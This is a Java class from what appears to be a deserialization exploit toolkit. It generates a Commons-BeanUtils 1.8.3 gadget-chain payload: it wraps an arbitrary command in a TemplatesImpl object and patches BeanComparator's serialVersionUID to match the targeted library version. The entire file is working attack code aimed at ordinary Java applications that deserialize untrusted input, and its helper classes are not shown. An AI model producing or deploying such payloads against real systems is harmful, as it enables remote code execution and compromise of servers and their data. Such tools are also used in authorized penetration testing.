package com.qi4l.JYso.gadgets;

import com.qi4l.JYso.gadgets.annotation.Dependencies;
import com.qi4l.JYso.gadgets.utils.Gadgets;
import javassist.ClassPool;
import javassist.CtClass;

import static com.qi4l.JYso.gadgets.cb160.getCbSink_1;
import static com.qi4l.JYso.gadgets.utils.InjShell.insertField;

@SuppressWarnings({"unused"})
@Dependencies({"commons-beanutils:commons-beanutils:1.8.3", "commons-beanutils:commons-beanutils:1.7X"})
public class cb183 implements ObjectPayload<Object> {

    @Override
    public Object getObject(String command) throws Exception {
        final Object template;
        template = Gadgets.createTemplatesImpl(command);
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.get("org.apache.commons.beanutils.BeanComparator");

        insertField(ctClass, "serialVersionUID", "private static final long serialVersionUID = -3490850999041592962L;");
        return getCbSink_1(ctClass,template);
    }
}
